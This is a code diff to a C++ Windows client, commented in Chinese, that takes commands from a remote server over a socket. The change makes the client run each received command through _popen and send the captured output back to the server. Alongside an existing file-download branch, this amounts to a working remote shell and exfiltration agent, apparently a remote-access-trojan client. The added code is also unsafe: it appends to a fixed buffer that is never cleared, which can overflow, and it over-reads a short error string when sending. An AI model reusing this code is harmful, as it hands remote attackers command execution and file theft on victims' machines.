@@ -22,7 +22,7 @@ using namespace std;
 #define MAC_ADDR_LEN	18
 #define DEFAULT_BUFLEN  1024
 char MacAddr[MAC_ADDR_LEN];
-
+char cmdbuffer[DEFAULT_BUFLEN] = { 0 };          //用1024的空间来存储输出的内容，只要不是显示文件内容，一般情况下是够用了。  
 
 int getFileSizeSystemCall(char * strFileName)
 {
@@ -74,6 +74,22 @@ int recvn(SOCKET s, char* recvbuf, unsigned int fixedlen)
 char *execute_cmd(char *strCmd)
 {
 	return "";
+}
+
+bool execmd(char* cmd, char* result) {
+	char buffer[DEFAULT_BUFLEN];                         //定义缓冲区                        
+	FILE* pipe = _popen(cmd, "r");            //打开管道，并执行命令 
+	if (!pipe)
+		return 0;                      //返回0表示运行失败 
+
+	while (!feof(pipe)) {
+		if (fgets(buffer, 128, pipe)) {             //将管道输出到result中 
+			strcat(result, buffer);
+		}
+	}
+	_pclose(pipe);                            //关闭管道 
+	cout << result << endl;
+	return 1;                                 //返回1表示运行成功 
 }
 
 int main(int argc, char * argv[])
@@ -155,6 +171,8 @@ int main(int argc, char * argv[])
 		memset(CmdBuff, 0, MAX_CMD_LEN);
 		if(reclen > 0)
 		{
+			bool suc;
+			char * error = "客户端执行该命令时返回异常！\n";
 			Ret = recvn(ClientSocket, CmdBuff, reclen);
 			if(Ret != reclen)
 				break;
@@ -169,8 +187,19 @@ int main(int argc, char * argv[])
 			case CMD_CMD:
 				printf("cmd: %s\n", pStrCmd);
 				// execute cmd and send result to server
-				system(pStrCmd);
+				//system(pStrCmd);
+				suc = execmd(pStrCmd,cmdbuffer);
+				int iResult;
+				if (suc) iResult = send(ClientSocket, cmdbuffer, DEFAULT_BUFLEN, 0);
+				else iResult = send(ClientSocket, error, DEFAULT_BUFLEN, 0);
+				if (iResult == SOCKET_ERROR) {
+					printf("发送失败！错误编号: %d\n", WSAGetLastError());
+					closesocket(ClientSocket);
+					WSACleanup();
+					return 1;
+				}
 				break;
+
 			case CMD_DOWNLOAD:
 				// read file and send to server
 				printf("download file: %s\n", pStrCmd);
@@ -187,7 +216,7 @@ int main(int argc, char * argv[])
 				/*char *filelenchar;
 				filelenchar = (char *)(&invfilelen);*/
 
-				int iResult = send(ClientSocket, (char *)(&invfilelen), 4, 0);//发送文件长度
+				iResult = send(ClientSocket, (char *)(&invfilelen), 4, 0);//发送文件长度
 
 				int tosendlen = filelen;
 
